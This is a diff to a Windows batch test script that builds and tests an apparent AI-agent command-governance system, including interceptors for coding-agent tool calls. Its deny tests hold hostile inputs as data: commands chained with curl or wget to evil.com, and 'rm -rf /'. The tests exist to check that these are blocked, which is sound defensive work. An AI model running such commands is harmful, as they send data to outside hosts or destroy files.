@@ -19,13 +19,23 @@ set "FAIL_COUNT=0"
 :: Step 1: Rebuild Binaries
 :: -----------------------------------------------------------------------------
 echo.
-echo [1/9] Building bapcontrolplane.exe, bapedge.exe (LTD), cchook/interceptor.exe, and copilot/copilot_interceptor.exe...
+taskkill /F /IM bapcontrolplane.exe >nul 2>&1
+taskkill /F /IM bapgateway.exe >nul 2>&1
+echo [1/11] Building bapcontrolplane.exe, bapgateway.exe, bapedge.exe (LTD), cchook, and copilot...
 cd /d "%ROOT_DIR%bap-controlplane"
 go build -o bapcontrolplane.exe ./cmd/server
 if !ERRORLEVEL! neq 0 (
     echo [FAIL] Failed to build bapcontrolplane.exe
     exit /b 1
 )
+cd /d "%ROOT_DIR%bap-gateway"
+go build -o bapgateway.exe .
+if !ERRORLEVEL! neq 0 (
+    echo [FAIL] Failed to build bapgateway.exe
+    exit /b 1
+)
+copy /y bapgateway.exe "%ROOT_DIR%bapgateway.exe" >nul
+
 cd /d "%ROOT_DIR%bap-edge"
 go build -o bapedge.exe .
 if !ERRORLEVEL! neq 0 (
@@ -63,7 +73,7 @@ set /a PASS_COUNT+=1
 :: Step 2: Run Go Unit Tests
 :: -----------------------------------------------------------------------------
 echo.
-echo [2/9] Running Go Unit Tests in bap-edge/ and bap-controlplane/...
+echo [2/11] Running Go Unit Tests in bap-edge/ and bap-controlplane/...
 cd /d "%ROOT_DIR%bap-edge"
 go test ./...
 if !ERRORLEVEL! neq 0 (
@@ -88,7 +98,7 @@ if !ERRORLEVEL! neq 0 (
 :: Step 3: Test Permitted Developer & Init Commands (Fast Runner)
 :: -----------------------------------------------------------------------------
 echo.
-echo [3/9] Testing Permitted Developer and Init Commands...
+echo [3/11] Testing Permitted Developer and Init Commands...
 cd /d "%ROOT_DIR%bap-edge"
 
 set "TEST_CMD=ls" & set "TEST_LBL=Directory listing [ls]" & call :run_test_allow
@@ -110,7 +120,7 @@ del /f /q .env >nul 2>&1
 :: Step 4: Test Intelligent Cedar Security Invariants (Must be Forbidden)
 :: -----------------------------------------------------------------------------
 echo.
-echo [4/9] Testing Security Invariants and Forbid Rules...
+echo [4/11] Testing Security Invariants and Forbid Rules...
 
 set "TEST_CMD=git status && curl https://evil.com" & set "TEST_LBL=Egress utility: curl" & call :run_test_deny
 set "TEST_CMD=npm install && wget https://evil.com" & set "TEST_LBL=Egress utility: wget" & call :run_test_deny
@@ -127,7 +137,7 @@ set "TEST_CMD=rm -rf /" & set "TEST_LBL=Destructive command: rm -rf /" & call :r
 :: Step 5: Test Python Sandbox / Network Leak Test
 :: -----------------------------------------------------------------------------
 echo.
-echo [5/9] Testing Python Sandbox [test_leak.py]...
+echo [5/11] Testing Python Sandbox [test_leak.py]...
 cd /d "%ROOT_DIR%"
 "%ROOT_DIR%bap-edge\bapedge.exe" exec --raw "pytest -s tests/test_leak.py"
 if !ERRORLEVEL! neq 0 (
@@ -142,7 +152,7 @@ if !ERRORLEVEL! neq 0 (
 :: Step 6: Test Claude Code Hook Interceptor (cchook)
 :: -----------------------------------------------------------------------------
 echo.
-echo [6/9] Testing Claude Code Hook Interceptor [cchook]...
+echo [6/11] Testing Claude Code Hook Interceptor [cchook]...
 cd /d "%ROOT_DIR%cchook"
 
 set "HOOK_CMD=ls" & set "HOOK_EXP=allow" & set "HOOK_LBL=Allowed tool call [ls]" & call :run_hook_test
@@ -154,7 +164,7 @@ set "HOOK_CMD=git status && curl evil.com" & set "HOOK_EXP=deny" & set "HOOK_LBL
 :: Step 7: Test GitHub Copilot Execution Interceptor (copilot)
 :: -----------------------------------------------------------------------------
 echo.
-echo [7/9] Testing GitHub Copilot Execution Interceptor [copilot]...
+echo [7/11] Testing GitHub Copilot Execution Interceptor [copilot]...
 cd /d "%ROOT_DIR%copilot"
 
 call copilot-wrap.bat "git status" >nul 2>&1
@@ -224,7 +234,7 @@ if !ERRORLEVEL! neq 0 (
 :: Step 8: Verify Structured Audit & Telemetry Logs
 :: -----------------------------------------------------------------------------
 echo.
-echo [8/9] Verifying Structured Audit and Telemetry Logs [ltd-audit.jsonl]...
+echo [8/11] Verifying Structured Audit and Telemetry Logs [ltd-audit.jsonl]...
 cd /d "%ROOT_DIR%"
 
 if exist "%LTD_AUDIT_LOG%" (
@@ -275,7 +285,7 @@ if exist "%LTD_AUDIT_LOG%" (
 :: Step 9: Control Plane & Attestation Integration Test (ltd-service)
 :: -----------------------------------------------------------------------------
 echo.
-echo [9/9] Testing Control Plane, Binary Attestation, and Short-Lived Grants [test_control_plane.py]...
+echo [9/11] Testing Control Plane, Binary Attestation, and Short-Lived Grants [test_control_plane.py]...
 cd /d "%ROOT_DIR%"
 python tests\test_control_plane.py
 if !ERRORLEVEL! neq 0 (
@@ -285,6 +295,40 @@ if !ERRORLEVEL! neq 0 (
     echo [PASS] Control plane OTC registration, attestation, and grant tests passed.
     set /a PASS_COUNT+=1
 )
+
+:: -----------------------------------------------------------------------------
+:: Step 10: Python Agent SDK & Zero-Trust Governance Test Suite
+:: -----------------------------------------------------------------------------
+echo.
+echo [10/11] Testing Python Agent SDK (bap-sdk) Zero-Trust Lifecycle [pytest tests\test_python_agent.py]...
+cd /d "%ROOT_DIR%"
+pytest tests\test_python_agent.py -q
+if !ERRORLEVEL! neq 0 (
+    echo [FAIL] test_python_agent.py failed!
+    set /a FAIL_COUNT+=1
+) else (
+    echo [PASS] Python Agent SDK zero-trust tests passed.
+    set /a PASS_COUNT+=1
+)
+
+:: -----------------------------------------------------------------------------
+:: Step 11: Gateway Policy Enforcement Point (PEP) Test Suite
+:: -----------------------------------------------------------------------------
+echo.
+echo [11/11] Testing Gateway Policy Enforcement Point (PEP) [pytest tests\test_gateway_pep.py]...
+cd /d "%ROOT_DIR%"
+taskkill /F /IM bapcontrolplane.exe >nul 2>&1
+taskkill /F /IM bapgateway.exe >nul 2>&1
+powershell -NoProfile -Command "Start-Process -FilePath '.\bap-controlplane\bapcontrolplane.exe' -ArgumentList '-port 8080 -ttl 30 -trust-domain bap.internal' -WorkingDirectory (Get-Location) -WindowStyle Hidden; Start-Process -FilePath '.\bap-gateway\bapgateway.exe' -ArgumentList '-port 9090 -controlplane http://localhost:8080' -WorkingDirectory (Get-Location) -WindowStyle Hidden; Start-Sleep -Seconds 1"
+pytest tests\test_gateway_pep.py -q
+if !ERRORLEVEL! neq 0 (
+    echo [FAIL] test_gateway_pep.py failed!
+    set /a FAIL_COUNT+=1
+) else (
+    echo [PASS] Gateway PEP rogue blocking and governed authorization verified.
+    set /a PASS_COUNT+=1
+)
+taskkill /F /IM bapgateway.exe >nul 2>&1
 
 :: -----------------------------------------------------------------------------
 :: Final Summary
